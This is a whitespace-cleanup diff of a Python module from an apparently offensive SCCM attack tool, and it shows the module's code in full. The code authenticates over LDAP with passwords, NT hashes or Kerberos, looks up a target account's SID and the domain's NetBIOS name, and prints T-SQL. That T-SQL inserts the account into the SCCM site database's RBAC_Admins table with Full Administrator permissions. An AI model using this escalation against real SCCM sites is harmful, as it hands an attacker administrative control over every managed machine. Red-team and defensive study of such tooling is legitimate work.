@@ -1,5 +1,5 @@
 from lib.ldap import init_ldap_session
-from lib.logger import logger 
+from lib.logger import logger
 from impacket.ldap import ldaptypes
 import ldap3
 from getpass import getpass
@@ -14,8 +14,8 @@ https://github.com/Mayyhem/SharpSCCM
 
 class MSSQL:
 
-    def __init__(self, username=None, password=None, domain=None, target_dom=None, 
-                        dc_ip=None,ldaps=False, kerberos=False, no_pass=False, hashes=None, 
+    def __init__(self, username=None, password=None, domain=None, target_dom=None,
+                        dc_ip=None,ldaps=False, kerberos=False, no_pass=False, hashes=None,
                         aes=None, debug=False, target_user=None, stacked=False, site_code=None):
             self.username = username
             self.password = password
@@ -33,12 +33,12 @@ class MSSQL:
             self.site_code = site_code
             self.netbiosname = ""
             self.query_sid = ""
-    
+
     def run(self):
-           
+
         lmhash = ""
         nthash = ""
-        
+
         if self.hashes:
             lmhash, nthash = self.hashes.split(':')
         if not (self.password or self.hashes or self.aes or self.no_pass):
@@ -52,11 +52,11 @@ class MSSQL:
 
         try:
             ldap_server, self.ldap_session = init_ldap_session(domain=self.domain, username=self.username, password=self.password,
-                                                           lmhash=lmhash, nthash=nthash, kerberos=self.kerberos, domain_controller=self.dc_ip, 
+                                                           lmhash=lmhash, nthash=nthash, kerberos=self.kerberos, domain_controller=self.dc_ip,
                                                            aesKey=self.aes, hashes=self.hashes, ldaps=self.ldaps)
             logger.debug(f'[+] Bind successful {ldap_server}')
 
-        except ldap3.core.exceptions.LDAPSocketOpenError as e: 
+        except ldap3.core.exceptions.LDAPSocketOpenError as e:
             if 'invalid server address' in str(e):
                 logger.info(f'[-] Invalid server address - {self.domain}')
             else:
@@ -67,16 +67,16 @@ class MSSQL:
         except ldap3.core.exceptions.LDAPBindError as e:
             logger.info(f'[-] Error: {str(e)}')
             return False
-        
+
         logger.info(f'[*] Resolving {self.target_user} SID...')
-        
+
 
         try:
-            self.ldap_session.extend.standard.paged_search(self.search_base, 
-                                                           search_filter=f"(samaccountname={self.target_user})", 
+            self.ldap_session.extend.standard.paged_search(self.search_base,
+                                                           search_filter=f"(samaccountname={self.target_user})",
                                                            attributes="objectsid",
-                                                           paged_size=1, 
-                                                           generator=False)  
+                                                           paged_size=1,
+                                                           generator=False)
         except ldap3.core.exceptions.LDAPAttributeError as e:
             print()
             logger.info(f'[-] Error: {str(e)}')
@@ -95,15 +95,15 @@ class MSSQL:
         else:
             print("[-] Failed to resolve target SID.")
             return False
-        
+
         try:
             search_base = f"CN=Configuration,{self.search_base}"
             search_filter = f"(&(objectclass=crossRef)(ncname={self.search_base}))"
-            self.ldap_session.extend.standard.paged_search(search_base=search_base, 
-                                                           search_filter=search_filter, 
+            self.ldap_session.extend.standard.paged_search(search_base=search_base,
+                                                           search_filter=search_filter,
                                                            attributes="nETBIOSName",
-                                                           paged_size=1, 
-                                                           generator=False)  
+                                                           paged_size=1,
+                                                           generator=False)
         except ldap3.core.exceptions.LDAPAttributeError as e:
             print()
             logger.info(f'[-] Error: {str(e)}')
@@ -115,23 +115,23 @@ class MSSQL:
         else:
             print("[-] Failed to resolve netbiosname.")
             return False
-        
+
         self.mssql_abuse(self.querysid)
-        
+
     def mssql_abuse(self,hex_sid):
         hex_sid = hex_sid
         logger.info(f"[*] Use the following to add {self.target_user} as a Site Server Admin.")
         #need to fix this to get the flatname of the domain. from testing the domain doesn't really matter and
         #is used just for display
         formatted_user = f'{self.netbiosname}\\{self.target_user}'
-        
+
         if self.stacked:
             query = f'''
 DECLARE @AdminID INT; USE CM_{self.site_code}; INSERT INTO RBAC_Admins (AdminSID, LogonName, IsGroup, IsDeleted, CreatedBy, CreatedDate, ModifiedBy, ModifiedDate, SourceSite) SELECT {hex_sid}, '{formatted_user}', 0, 0, '', '', '', '', '{self.site_code}' WHERE NOT EXISTS ( SELECT 1 FROM RBAC_Admins WHERE LogonName = '{formatted_user}' ); SET @AdminID = (SELECT TOP 1 AdminID FROM RBAC_Admins WHERE LogonName = '{formatted_user}'); INSERT INTO RBAC_ExtendedPermissions (AdminID, RoleID, ScopeID, ScopeTypeID) SELECT @AdminID, RoleID, ScopeID, ScopeTypeID FROM (VALUES  ('SMS0001R', 'SMS00ALL', 29), ('SMS0001R', 'SMS00001', 1), ('SMS0001R', 'SMS00004', 1) ) AS V(RoleID, ScopeID, ScopeTypeID) WHERE NOT EXISTS ( SELECT 1 FROM RBAC_ExtendedPermissions  WHERE AdminID = @AdminID  AND RoleID = V.RoleID  AND ScopeID = V.ScopeID AND ScopeTypeID = V.ScopeTypeID );
             '''
             print(query)
             return
-    
+
         first_queries = f'''
 use CM_{self.site_code}
 INSERT INTO RBAC_Admins (AdminSID,LogonName,IsGroup,IsDeleted,CreatedBy,CreatedDate,ModifiedBy,ModifiedDate,SourceSite) VALUES ({hex_sid},'{self.netbiosname}\\{self.target_user}',0,0,'','','','','{self.site_code}');
@@ -154,10 +154,10 @@ INSERT INTO RBAC_ExtendedPermissions (AdminID,RoleID,ScopeID,ScopeTypeID) VALUES
         base = ''
         for comp in components:
             base += f',DC={comp}'
-        
+
         return base[1:]
 
 
 
 
-        
+
